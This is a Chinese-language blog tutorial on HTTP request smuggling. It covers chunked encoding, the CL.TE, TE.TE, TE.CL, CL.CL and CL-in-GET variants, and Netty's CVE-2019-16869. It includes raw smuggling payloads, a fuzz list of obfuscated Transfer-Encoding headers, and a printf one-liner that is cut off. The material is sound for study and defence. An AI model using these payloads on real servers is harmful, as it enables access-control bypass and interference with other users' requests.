&lt;p>请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致时，这种差异可以让我们在一个HTTP请求中嵌入另一个HTTP请求 以达到走私的目的，直接表现为我们可以访问内网服务，或者造成一些其他的攻击&lt;/p>
&lt;h4 id="keep-alive--pipeline">keep-alive &amp;amp; pipeline&lt;/h4>
&lt;p>为了缓解源站的压力，一般会在用户和后端服务器（源站）之间加设前置服务器，用以缓存、简单校验、负载均衡等，而前置服务器与后端服务器往往是在可靠的网络域中，ip 也是相对固定的，所以可以重用 TCP 连接来减少频繁 TCP 握手带来的开销&lt;/p>
&lt;p>这里就用到了HTTP1.1中的&lt;code>Keep-Alive&lt;/code>和&lt;code>Pipeline&lt;/code>特性，keep-alive让服务器在接受完这次的http请求后不要关闭TCP连接，对后面相同目标服务器的HTTP请求重用这一个TCP连接，这样只需一次TCP握手，减少服务器开销 节约资源；而Pipeline允许客户端像流水线一样发送请求，服务端根据FIFO原则响应&lt;/p>
&lt;p>以下是使用以及不使用 piepeline 技术的对比图：&lt;/p>
&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191017234109.png" alt="img">&lt;/p>
&lt;p>在整个过程中，如果前置服务器和后端服务器应当在HTTP请求的边界划分上不一致，当我们发送精心构造的模糊的HTTP请求，就会产生漏洞，而模糊的点就在于下面要提到的CL &amp;amp; TE&lt;/p>
&lt;h4 id="cl--te">CL &amp;amp; TE&lt;/h4>
&lt;p>HTTP规范提供了两种不同的方法来指定请求的结束位置 &lt;code>Content-Length&lt;/code>和&lt;code>Transfer-Encoding&lt;/code>；其中TE请求头比较特殊，HTTP/2中不再支持，指定用于传输请求主体的编码方式，可用的值有chunked/compress/deflate/gzip/identity | &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding#Directives">doc&lt;/a>&lt;/p>
&lt;p>这里我们关注&lt;code>Transfer-Encoding: chunked&lt;/code>，当这样设置之后，body按一系列块的形式发送 并省略CL头；每个块的开头用16禁止数表明当前块的长度，数值后接2字节的&lt;code>\r\n&lt;/code>，然后是块的内容，再接&lt;code>\r\n&lt;/code>表示结束，最后用长度为0的块表示终止块，终止块后是trailer，由0或多个实体头组成，可以存放对数据的数字签名&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/x-www-form-urlencoded&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>q=smuggling
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hahaha
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[空白行]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[空白行]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]
&lt;/code>&lt;/pre>&lt;p>在计算长度时注意这样的原则：&lt;/p>
&lt;ul>
&lt;li>CL需要将body中&lt;code>\r\n&lt;/code>所占的2字节计算在内，而块长度要忽略块内容末尾表示终止的&lt;code>\r\n&lt;/code>&lt;/li>
&lt;li>请求头和body中空行不计入CL&lt;/li>
&lt;/ul>
&lt;p>测试用chunked发送&lt;/p>
&lt;pre tabindex="0">&lt;code>Wikipedia in\r\n\r\nchunks.
&lt;/code>&lt;/pre>&lt;p>可以这样&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/xxx&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">xxx&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/plain&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">4\r\n&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Wiki\r\n&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">5\r\n&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">pedia\r\n&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">e\r\n&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#960050;background-color:#1e0010">in\r\n\r\nchunks.\r\n&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">0\r\n&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">\r\n&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>4是16进制数 后接2字节&lt;code>\r\n&lt;/code>表示chunk-size，后接chunk-size大小的Wiki，后接两字节的&lt;code>\r\n&lt;/code>表示chunk-data部分&lt;/p>
&lt;p>第三部分数据&lt;/p>
&lt;pre tabindex="0">&lt;code>e\r\n
in\r\n\r\nchunks.\r\n
&lt;/code>&lt;/pre>&lt;p>e = 14 = 1(空格) + 2(in) + 4(\r\n*2) + 7(chunks.)&lt;/p>
&lt;p>最后的&lt;code>0\r\n\r\n&lt;/code>表示 chunk 部分结束&lt;/p>
&lt;h3 id="攻击方式">攻击方式&lt;/h3>
&lt;h4 id="clte">CL.TE&lt;/h4>
&lt;p>前端服务器处理&lt;code>Content-Length&lt;/code>，后端服务器遵守RFC2616规定处理&lt;code>Transfer-Encoding&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>a
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>a会被认作下一个请求的一部分，留在缓冲区等待剩余的请求，此时再有GET就会被拼接为&lt;code>aGET / HTTP/1.1\r\n&lt;/code>，畸形的&lt;code>aGET&lt;/code>会造成解析异常&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">a&lt;/span>&lt;span style="color:#75af00">GET&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">....&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果存在这样的漏洞，发送上面的payload会造成延时（后端服务器等下一个chunk来清掉缓冲区&lt;/p>
&lt;h4 id="tecl">TE.CL&lt;/h4>
&lt;p>前端服务器&lt;code>Transfer-Encoding&lt;/code>，后端服务器&lt;code>Content-Length&lt;/code>标头&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">example.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Transfer-Encoding: chunked
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>17
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>POST /rook1e HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[空白行]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[空白行]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>前端服务器分块传输长度为17的块&lt;code>POST /rook1e HTTP/1.1\r\n&lt;/code>，后端则根据CL=4截取到&lt;code>17\r\n&lt;/code>并把后面的放入缓冲区，此时再有GET就会被拼接为&lt;code>POST /rook1e&lt;/code>走私请求&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/rook1e&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET / HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>....
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果存在这样的漏洞，发送上面的payload会造成延时（后端服务器等待剩余部分&lt;/p>
&lt;h4 id="tete">TE.TE&lt;/h4>
&lt;p>前端和后端服务器都支持&lt;code>Transfer-Encoding&lt;/code> 标头，但是容错性上表现不同，可以通过以某种方式来诱导其中一个服务器不处理它，变为上面两种之一&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/x-www-form-urlencoded&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding[空格]&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GPOST / HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/x-www-form-urlencoded
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 15
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x=1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[空白行]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[空白行]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>fuzz用payload，根据实现RFC的不同而有细微的差别&lt;/p>
&lt;pre tabindex="0">&lt;code>Transfer-Encoding: xchunked
Transfer-Encoding[空格]: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[空格]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
&lt;/code>&lt;/pre>&lt;h4 id="clcl">CL.CL&lt;/h4>
&lt;p>请求包中包含两个不同值得&lt;code>Content-Length&lt;/code>，根据RFC7230会返回400，但是有可能服务器并没有严格遵守这个规范&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">POST / HTTP/1.1\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Host: example.com\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Content-Length: 8\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Content-Length: 7\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">12345\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">a
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>a会被带入下一个请求，变为&lt;code>aGET / HTTP/1.1\r\n&lt;/code>&lt;/p>
&lt;h4 id="cl-in-get">CL in GET&lt;/h4>
&lt;p>前端服务器允许GET携带body，后端不允许GET携带body 并直接忽略GET请求中的&lt;code>Content-Length&lt;/code>标头，基于pipeline机制认为这是两个独立的请求（类似Nodejs中的cve-2018-12116）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">GET / HTTP/1.1\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Host: example.com\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Content-Length: 41\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">GET /secret HTTP/1.1\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Host: example.com\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>后端认作两个独立的请求，这里格外注意CL值得计算22+19=41（分别len一下&lt;/p>
&lt;pre tabindex="0">&lt;code>GET /secret HTTP/1.1\r\n --&amp;gt; 20个字符+CRLF = 22
Host: example.com\r\n --&amp;gt; 17个字符+CRLF = 19
&lt;/code>&lt;/pre>&lt;h4 id="optional-whitespacecve-2019-16869">optional whitespace/cve-2019-16869&lt;/h4>
&lt;p>RFC7320中要求header部分 字段之后要紧跟&lt;code>:&lt;/code>，之后是optional whitespace；如果有中间件没有严格实现这个RFC就会有被攻击的可能&lt;/p>
&lt;p>cve-2019-16869是Netty中间件的漏洞，在4.1.42Final版本前对于Header头的处理是使用&lt;a href="https://github.com/netty/netty/blob/netty-4.1.41.Final/codec-http/src/main/java/io/netty/handler/codec/http/HttpObjectDecoder.java">splitHeader&lt;/a>方法，其中关键代码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">nameEnd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">nameStart&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">nameEnd&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">nameEnd&lt;/span> &lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">ch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">charAt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">nameEnd&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ch&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">Character&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isWhitespace&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ch&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里将空格与冒号同样处理了，也就是说如果存在空格会把冒号之前的field name正常处理而不会抛出错误或进行其他操作&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/getusers&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">www.backend.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET /hacker HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: www.hacker.com
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hacker: hacker
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用ELB作前端服务器，Netty作后端服务器，当发送上述请求时由于TE字段冒号前的空格不符合RFC标准，会被ELB忽略 按照CL解析并转发给后端的Netty，Netty会优先解析TE（即使不合RFC的标准）并拆分为一以下两个请求&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/getusers&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">www.backend.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">GET&lt;/span> &lt;span style="color:#111">/hacker&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">www.hacker.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">hacker&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">hacker&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在4.1.42Final中修复了这个洞，当不规范的请求头出现时会返回400&lt;/p>
&lt;h4 id="chunk-size-issue">chunk size issue&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">printf&lt;/span> &lt;span style="color:#d88200">&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8045ff">&lt;/span>&lt;span style="color:#d88200">&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8045ff">&lt;/span>&lt;span style="color:#d88200">&amp;#39;Transfer-Encoding: chunked\r\n&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8045ff">&lt;/span>&lt;span style="color:#d88200">&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8045ff">&lt;/span>&lt;span style="color:#d88200">&amp;#39;\r\n&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8045ff">&lt;/span>&lt;span style="color:#d88200">&amp;#39;0000000000000000000000000000042\r\n&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8045ff">&lt;/span>&lt;span style="color:#d88200">&amp;#39;\r\n&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8045ff">&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET /tmp/ HTTP/1.1\r\n&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8045ff">&lt;/span>&lt;span style="color:#d88200">&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\
